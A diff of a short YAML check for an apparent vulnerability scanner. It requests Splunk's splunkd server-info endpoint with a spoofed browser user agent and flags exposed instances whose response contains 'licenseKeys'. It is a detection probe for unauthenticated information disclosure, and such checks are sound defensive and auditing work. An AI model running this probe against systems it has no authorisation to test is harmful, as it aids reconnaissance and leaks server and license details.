@@ -1,2 +1,10 @@
-payload: /en-US/splunkd/__raw/services/server/info/server-info?output_mode=json
-keyword: licenseKeys
+author: W01fh4cker
+request:
+  -
+    method: GET
+    payload: /en-US/splunkd/__raw/services/server/info/server-info?output_mode=json
+    # 自定义请求头，如果不填，则默认设置请求头只包含ua
+    headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+    keyword: licenseKeys
+    status: 200
